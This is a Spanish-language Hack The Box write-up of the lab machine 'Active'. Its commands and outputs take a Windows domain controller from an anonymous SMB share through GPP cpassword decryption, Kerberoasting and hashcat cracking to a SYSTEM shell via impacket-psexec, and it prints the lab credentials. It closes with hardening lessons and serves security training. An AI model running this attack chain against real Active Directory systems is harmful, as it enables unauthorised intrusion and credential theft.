---
title: "Active"
description: "Writeup de Active - Hack The Box - Dificultad: Easy. GPP cpassword en share Replication para obtener SVC_TGS → Kerberoast de Administrator → PsExec como SYSTEM."
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - windows
  - easy
  - active-directory
  - gpp-cpassword
  - kerberoast
  - psexec
---

# 🖥️ Active

> 📅 Fecha: 2026-06-16
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Windows Server 2008 R2 SP1
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> ⏱️ Tiempo invertido: 2h 12m
> 🌐 IP: `10.129.16.43`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración SMB anónima](#-enumeración-smb-anónima)
- [GPP cpassword → SVC_TGS](#-gpp-cpassword--svc_tgs)
- [Kerberoast → Administrator](#-kerberoast--administrator)
- [Acceso como SYSTEM](#-acceso-como-system)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Active es un Domain Controller Windows Server 2008 R2 que expone el share `Replication` con acceso anónimo. Contiene un archivo `Groups.xml` de Group Policy Preferences con la contraseña de `SVC_TGS` cifrada con AES-256 (clave pública de Microsoft) — descifrable con `gpp-decrypt`. Con esas credenciales se ejecuta **Kerberoast** contra `Administrator`, cuyo TGS-REP (etype 23) se rompe con `rockyou.txt` en 3 segundos. `impacket-psexec` con la contraseña da shell como `NT AUTHORITY\SYSTEM`.

| Campo | Valor |
|-------|-------|
| Puntos débiles | GPP cpassword en share anónimo, Kerberoast de cuenta privilegiada con contraseña débil |
| CVEs | MS14-068 (contexto histórico), clave AES de GPP pública desde 2012 |
| Herramientas | `nmap`, `nxc`, `smbclient`, `gpp-decrypt`, `impacket-GetUserSPNs`, `hashcat`, `impacket-psexec` |
| Tiempo total | ~2h 12m |

---

## 🔍 Reconocimiento

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.16.43
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb)
445/tcp   open  microsoft-ds?
5722/tcp  open  msrpc
9389/tcp  open  mc-nmf
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1
```

DC clásico: DNS + Kerberos + LDAP + SMB. Dominio: `active.htb`.

```bash
echo "10.129.16.43 active.htb" | sudo tee -a /etc/hosts
```

---

## 🗂️ Enumeración SMB anónima

```bash
nxc smb 10.129.16.43 -u '' -p '' --shares
```

```text
SMB    10.129.16.43  445  DC  [+] active.htb\:
SMB    10.129.16.43  445  DC  Share           Permissions
SMB    10.129.16.43  445  DC  Replication     READ
```

El share `Replication` es legible sin credenciales — descarga masiva de su contenido:

```bash
smbclient //10.129.16.43/Replication -N -c 'recurse;prompt;mget *'
```

Entre los archivos descargados, el relevante es:

```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

---

## 🔑 GPP cpassword → SVC_TGS

```bash
cat active.htb/Policies/{31B2F340...}/MACHINE/Preferences/Groups/Groups.xml
```

```xml
<User ... name="active.htb\SVC_TGS" ...>
  <Properties ... cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" userName="active.htb\SVC_TGS"/>
</User>
```

`cpassword` es AES-256 con clave pública desde 2012 (MS14-025). `gpp-decrypt` la resuelve:

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

Credenciales: `SVC_TGS:GPPstillStandingStrong2k18`. Verificación:

```bash
nxc smb 10.129.16.43 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

```text
[+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
Share: Users  READ
```

```bash
smbclient //10.129.16.43/Users -U 'active.htb\SVC_TGS%GPPstillStandingStrong2k18'
smb: \> cd SVC_TGS\Desktop
smb: \> get user.txt
```

---

## 🚀 Kerberoast → Administrator

Con credenciales válidas, enumeramos SPNs kerberoasteables:

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.16.43 -request
```

```text
ServicePrincipalName  Name           MemberOf
--------------------  -------------  -------------------------------------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,...

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$eaf4d1b3...4a303b
```

`Administrator` tiene SPN registrado (CIFS/DC), por lo que se puede solicitar su TGS-REP. Hash etype 23 (RC4):

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
$krb5tgs$23$*Administrator$ACTIVE.HTB$...:Ticketmaster1968

Status: Cracked — Time: 3 secs
```

Credenciales: `Administrator:Ticketmaster1968`

---

## 🖥️ Acceso como SYSTEM

```bash
impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.16.43
```

```text
[*] Found writable share ADMIN$
[*] Uploading file OSAIDRbN.exe
[*] Creating service aRlR on 10.129.16.43...
Microsoft Windows [Version 6.1.7601]

C:\Windows\system32> whoami
nt authority\system
```

```text
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
[root flag]
```

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. SMB anónimo → share Replication legible
        ↓
2. Groups.xml → cpassword AES cifrado con clave pública MS
        ↓
3. gpp-decrypt → SVC_TGS:GPPstillStandingStrong2k18
        ↓
4. SVC_TGS lee share Users → user.txt
        ↓
5. GetUserSPNs → Administrator tiene SPN → TGS-REP etype 23
        ↓
6. hashcat -m 13100 + rockyou → Ticketmaster1968 (3s)
        ↓
7. impacket-psexec → NT AUTHORITY\SYSTEM → root.txt
```

---

## 🎓 Lecciones Aprendidas

- **GPP cpassword** fue parchado en MS14-025 (2014) pero máquinas antiguas siguen exponiéndolo. Cualquier archivo `Groups.xml`/`Scheduledtasks.xml` en SYSVOL/Replication es candidato inmediato.
- **Administrator con SPN**: es mala práctica registrar SPNs en cuentas privilegiadas. Si el TGS-REP se puede solicitar por cualquier usuario autenticado, la contraseña queda expuesta a cracking offline.
- **SMB anónimo en producción**: el share `Replication` no debería ser legible sin autenticación. SYSVOL sí necesita ser legible por usuarios de dominio, pero no por sesiones nulas.
- **Etype 23 (RC4)**: el hash TGS-REP RC4 es crackeable más rápido que AES. Forzar AES-256 en todos los SPNs limita la ventana de exposición.

---

## 📚 Referencias

- [HackTricks — GPP Passwords](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#gpp-group-policy-preferences)
- [MITRE ATT&CK — T1558.003 Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [MS14-025 — Group Policy Preferences passwords](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30)
